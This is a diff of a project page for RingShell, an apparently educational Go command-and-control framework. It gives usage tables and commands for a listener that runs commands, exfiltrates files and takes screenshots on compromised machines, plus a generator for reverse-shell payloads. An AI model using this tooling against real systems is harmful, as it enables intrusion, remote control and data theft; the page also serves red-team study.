@@ -1,169 +1,180 @@
 ﻿# RingShell Project
 
 === "Description"
-    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, intended for **educational purposes** in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:
+    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, provided for **educational purposes** in offensive security.  
+    It supports HTTP/HTTPS-based communication with reverse shell payloads and can be extended with user-developed payloads.
 
-    1. **Listener** – A shell interface for managing sessions with compromised systems.
+    RingShell consists of two main components:
 
-    2. **Payload Generator (Sauron)** – A binary generator for cross-platform reverse shell payloads.
+    1. **Listener** – An HTTP/HTTPS server that interacts with compromised machines, enabling shell access and file operations.
+    2. **Payload Generator (Sauron)** – Generates platform-specific reverse shell payloads using user-supplied network and system details.
+
 
 === "Code"
-    ``` golang title="main.go" linenums="1"
+    ``` go title="main.go" linenums="1"
     package main
+
     import (
         "flag"
         "fmt"
         "www.github.com/MustafaAbdulazizHamza/RingShellListener/Art"
         "www.github.com/MustafaAbdulazizHamza/RingShellListener/Server"
     )
+
     func main() {
         port := flag.Int("p", 8888, "Port number for the server to listen on")
+        https := flag.Bool("https", false, "Enable HTTPS (uses self-signed certificate if no cert/key provided)")
+        cert := flag.String("cert", "", "Path to TLS certificate file")
+        key := flag.String("key", "", "Path to TLS private key file")
         flag.Parse()
+
         Art.Art()
-        fmt.Printf("Starting server on port %d...\n", *port)
-        Server.Server(*port)
+        protocol := "HTTP"
+        if *https {
+            protocol = "HTTPS"
+        }
+        fmt.Printf("Starting %s server on port %d...\n", protocol, *port)
+        Server.Server(*port, *https, *cert, *key)
     }
     ```
 === "Documentation"
 
-    ### RingShell Documentation v1.0
+    ### RingShell Documentation v2.0
 
     ![RingShell](https://github.com/MustafaAbdulazizHamza/RingShell/blob/main/ringShell.png?raw=true)
-    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, intended for **educational purposes** in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:
 
-    1. **Listener** – A shell interface for managing sessions with compromised systems.
-    2. **Payload Generator (Sauron)** – A binary generator for cross-platform reverse shell payloads.
+    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, provided for **educational purposes** in offensive security.  
+    It supports HTTP/HTTPS-based communication with reverse shell payloads and can be extended with user-developed payloads.
+
+    RingShell consists of two main components:
+
+    1. **Listener** – An HTTP/HTTPS server that interacts with compromised machines, enabling shell access and file operations.
+    2. **Payload Generator (Sauron)** – Generates platform-specific reverse shell payloads using user-supplied network and system details.
 
     ---
 
-    ### 🧪 Installation
+    ## 🛰️ RingShell Listener
 
-    #### Prerequisites
+    A Golang-based interactive interface that enables users to:
 
-    - Linux-based environment
-    - [Go Programming Language](https://golang.org/dl/)
+    - **Manage sessions** with compromised machines:
+    - Execute arbitrary commands
+    - Upload/download files
+    - Take screenshots
+    - Retrieve specific files and images
 
-    #### Setup
+    - **HTTP/HTTPS communication** with optional self-signed certificate generation
+
+    - **Use scripting** to automate interactions using pre-written RingShell command files
+
+    ### Listener Commands
+
+    | Command | Description |
+    |---------|-------------|
+    | `bind listening <port> named <name>` | Start a TCP listener for data exfiltration |
+    | `bind controlling <port> named <name>` | Start a TCP server for broadcasting commands |
+    | `list sessions` | List all active sessions |
+    | `list servers listening` | List all listening servers |
+    | `list servers controlling` | List all controlling servers |
+    | `listen <session_id>` | Select a session to interact with |
+    | `set output <path>` | Set output directory for downloaded files |
+    | `get file <filepath>` | Download file(s) from the target |
+    | `get image <filepath>` | Download image(s) from the target |
+    | `get screenshots` | Capture and download screenshots |
+    | `upload file <filepath>` | Upload file(s) to the target |
+    | `upload executable <filepath>` | Upload and execute file(s) on the target |
+    | `import <script.rsh>` | Execute a RingShell script |
+    | `kill <server_name>` | Terminate a server |
+    | `q!` | Exit the shell |
+
+    ### Listener Flags
+
+    | Flag | Description |
+    |------|-------------|
+    | `--port` | HTTP server port (default: 8080) |
+    | `--https` | Enable HTTPS mode |
+    | `--cert` | Path to TLS certificate file |
+    | `--key` | Path to TLS key file |
+
+    If `--https` is enabled without `--cert` and `--key`, the listener will generate a self-signed certificate automatically.
+
+    ---
+
+    ## 🛠️ Sauron: The Payload Generator
+
+    **Sauron** is a command-line tool that creates reverse shell payloads based on:
+
+    - Listener IP and Port
+    - Target OS and architecture
+    - Communication protocol (HTTP/HTTPS)
+    - TLS verification settings
+
+    ### Sauron Flags
+
+    | Flag | Description |
+    |------|-------------|
+    | `-ip` | Listener IP address (required) |
+    | `-port` | Listener port number (required) |
+    | `-os` | Target operating system (required) |
+    | `-arch` | Target architecture (required) |
+    | `-out` | Output directory for the payload (required) |
+    | `-https` | Use HTTPS for communication |
+    | `-secure` | Enable TLS certificate verification (for valid certificates) |
+
+    ### Examples
 
     ```bash
-    git clone https://github.com/MustafaAbdulazizHamza/RingShell.git
-    cd RingShell/RingShell
-    go build -o RingShell
-    cd ../Sauron
-    go build -o sauron
+    ./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out ./output
+    ./sauron -ip 192.168.1.10 -port 443 -os linux -arch amd64 -https -out ./output
+    ./sauron -ip 192.168.1.10 -port 443 -os windows -arch amd64 -https -secure -out ./output
     ```
 
     ---
 
-    ### 📚 Terminology
+    ## 📦 Prerequisites
 
-    1. **Ring**  
-    A **Ring** refers to a deployed RingShell payload. It is the agent (or implant) that establishes a connection back to the C2 infrastructure, allowing remote control of the target system.
-
-    2. **Servers**  
-    In RingShell, a **Server** is a TCP endpoint created using the `bind` command. It can be one of the following:
-    
-    - **Listening Server**:  
-        A passive server that receives data (e.g., screenshots, logs) from a payload. It acts as a dropbox-style endpoint for exfiltration or monitoring.
-    
-    - **Controlling Server**:  
-        An active C2 component that maintains an interactive connection with one or more Rings. It sends commands and receives outputs from the connected agents.
-
-    3. **Sauron**  
-    **Sauron** is the command-line tool used to generate Rings (payloads). It supports custom parameters like target OS, architecture, listener IP/port, and output directory. The result is a compiled binary that can be deployed on the target system.
-    ---
-
-    ### 🛰️ RingShell Listener
-
-    The **RingShell Listener** provides an interactive CLI for managing active sessions, executing commands, transferring files, and controlling the C2 infrastructure.
-
-    #### 🧾 General Syntax
-
-    ```bash
-    command [subcommand] [arguments...]
-    ```
-
-    > Some commands require a selected session via `listen <session_id>`.
+    - Linux Machine
+    - [Golang](https://golang.org/dl/)
 
     ---
 
-    #### 📖 Command Reference
+    ## 🚀 Getting Started
 
-    Below is a table summarizing all available built-in commands:
+    1. **Clone the repository:**
 
-    | Command | Syntax | Description |
-    |--------|--------|-------------|
-    | **listen** | `listen <session_id>` | Focuses interaction on a specific zombie session. |
-    | **q!** | `q!` | Exits the RingShell interface. |
-    | **list** | `list [sessions \| servers] [listening \| controlling]` | Lists all active sessions or servers. |
-    | **set** | `set <option> <value>` | Sets global parameters: `port`, `timeout`, `out`. |
-    | **get** | `get <screenshots \| image \| file> [filename(s)]` | Retrieves data or files from the target. |
-    | **bind** | `bind <listening \| controlling> <port> [named <name>]` | Launches a server on the specified port. |
-    | **send** | `send To <controlling_server> <command \| file> <arg>` | Sends a command or script file to a controller. |
-    | **kill** | `kill <controlling \| listening> <name>` | Terminates a running server. |
-    | **import** | `import <script_file>` | Executes a RingShell script. |
-    | **upload** | `upload <file \| executable> <path>` | Uploads a file to the remote session. |
-    | *(any other command)* | `<command>` | Sent directly to the active session. |
+        ```bash
+        git clone https://github.com/MustafaAbdulazizHamza/RingShell.git
+        ```
 
-    ---
+    2. **Build the components:**
 
-    #### 🔄 Session-Specific Commands
+        ```bash
+        cd RingShell/RingShell
+        go build -o ringshell .
 
-    After using `listen <session_id>`, all subsequent inputs are interpreted as commands for that session.
+        cd ../Sauron
+        go build -o sauron .
+        ```
 
-    **Example:**
-    ```bash
-    listen zombie01
-    whoami
-    cd /tmp
-    ls -al
-    ```
+    3. **Start the listener:**
 
-    If no session is selected, the shell will warn:
+        ```bash
+        ./ringshell --port 8080
+        ./ringshell --port 443 --https
+        ./ringshell --port 443 --https --cert server.crt --key server.key
+        ```
 
-    ```text
-    You must specify a session ID before attempting to send a command.
-    ```
+    4. **Generate a payload:**
+
+        ```bash
+        ./sauron -ip <LISTENER_IP> -port <LISTENER_PORT> -os <TARGET_OS> -arch <TARGET_ARCH> -out ./output
+        ```
+
+    5. **Deploy the payload** on the target system and interact via the listener.
 
     ---
 
-    #### 💡 Auto-Completion
+    ## ⚠️ Disclaimer
 
-    RingShell includes intelligent auto-completion with:
-
-    - Session and server ID suggestions
-    - File and path hints
-    - Syntax assistance for multi-level commands
-
-    ---
-
-    ### 🧪 Sauron: Payload Generator
-
-    **Sauron** is a CLI utility that generates RingShell reverse shell binaries. It supports multiple platforms and architectures.
-
-    #### 🔧 Usage
-
-    ```bash
-    Usage of ./Sauron:
-    A tool that is used to generate rings based on user input.
-
-    Flags:
-    -arch string      Target architecture (e.g., amd64)
-    -ip string        Listener IP address
-    -os string        Target operating system (lowercase)
-    -out string       Full path to output directory
-    -port int         Port to connect back to
-
-    Example:
-    ./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out /home/user/output/
-    ```
-
-    ---
-
-    ### 🔐 Disclaimer
-
-    This tool is intended strictly for **educational** and **research** purposes in controlled environments.  
-    Misuse against systems without authorization is **illegal** and **prohibited**.
-
-=== "Download"
-    [![GitHub](https://img.shields.io/badge/Source-GitHub-blue)](https://github.com/MustafaAbdulazizHamza/RingShell)
+    - This project is intended for educational and research purposes only.
+    - The developers are not responsible for any misuse or damage caused by this tool.
